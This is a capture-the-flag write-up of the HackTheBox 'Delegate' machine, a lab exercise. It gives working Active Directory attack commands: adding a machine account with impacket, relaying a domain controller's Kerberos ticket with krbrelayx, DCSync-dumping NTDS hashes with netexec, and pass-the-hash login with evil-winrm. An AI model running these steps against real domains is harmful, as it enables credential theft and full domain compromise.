HackTheBox - Delegate

Delegate is a medium difficulty Windows machine, that requires us to abuse SMB guest access to steal credentials. Further enumeration reveals that the user has GenericWrite privileges over another user, who has SeEnableDelegationPrivilege and SeMachineAccountPrivilege enabled, which we can abuse to escalate our privileges.

PRIVILEGES INFORMATION

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled

Why do these privileges matter?

Delegation:
Delegation allows a user to pass their privileges to a different user or machine.

For example:
Anna has access to a file server and a web server. The web server does not have the privileges to access files from the file server. If Anna wants to get files from the file server on the web server, she can use delegation to “pass” her privileges on to the web server. The web server can now access the file server using Anna’s delegated privileges, without needing its own permissions to access those files.

Machine-Account-Privilege: This allows a user to add machines to the domain. It doesn’t mean much on its own, because you can also limit the amount of machines that can be added to the domain to zero, which would make this privilege useless (which we will check later down the line).

If N.Thompson can add more machines to the domain, we can add a new machine and enable the TRUSTED_FOR_DELEGATION flag for it. Then we can force the DC to authenticate to that machine via Kerberos delegation, which allows us to capture the TGT and perform a DC-Sync attack with it.

Checking out the amount of machines we can add

To see how many machines N.Thompson can add, we need to check out the MachineAccountQuota, which we can do by using the netexec MachineAccountQuota-module:

1
2
3

nxc ldap delegate.vl -u 'N.Thompson' -p '***' -M maq 
<...>
MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10

A MachineAccountQuota of 10 is the default, which means that we should be able to add new machines to the domain!

Adding a new machine

DO NOT use such a weak password in a real world environment!

We can use impacket-addcomputer to create a new machine.

1
2
3

sudo impacket-addcomputer -computer-name 'sanity' -computer-pass 'insane#!' -dc-ip 10.129.234.69 delegate.vl/N.Thompson:'***'
<...>
[*] Successfully added machine account sanity$ with password insane#!.

Now we need to add the machine to the DNS of the DC, which we can do with krbrelayx.

Capturing the TGT

For the next step we need the NTLM hash of our machine password, which we can get with a simple Python script. Then we can use the hash to start a relay to listen for connections. This has to be run from a second tab of your terminal!

1
2
3

python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","insane#!".encode("utf-16le")).digest()).decode())'

python3 ./krbrelayx/krbrelayx.py -hashes :2590f60ae026f77a26a1e605dd1ddc99

Abusing the TGT for DCSync

Next, we need to set up the Kerberos config file, which we can automatically generate using NetExec:

nxc smb dc1.delegate.vl -u 'sanity$' -p 'insane#!' --generate-krb5-file krb5.conf
<...>

SMB         10.129.234.69   445    DC1              [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf

Finally, we can use netexec to dump all account hashes:

The $-symbol is a special character in Bash that is used to access variables. You need to add a \ (backslash) in front of it so that Bash treats it as part of the filename rather than interpreting it as a variable reference.

1
2
3
4
5
6

KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache nxc smb dc1.delegate.vl --use-kcache --ntds
<...>
SMB         dc1.delegate.vl 445    DC1              Administrator:500:***:c321***ee93:::
SMB         dc1.delegate.vl 445    DC1              Guest:501:***:31d6***:::
SMB         dc1.delegate.vl 445    DC1              krbtgt:502:***:5499***:::
<...>

Now we can use PtH (pass the hash) via Evil-WinRM to log into the machine as administrator:

1

evil-winrm -i delegate.vl -u administrator -H c321***ee93

<Root Flag>

Conclusion

Thank you for reading, have a wonderful day and keep hacking!

What I learned from this box:

It is very important to specify the full SPN. In my first attempt I wrote cifs/sanity instead of cifs/sanity.delegate.vl. It made the DC authenticate to my relay, but it didn’t pass the TGT.
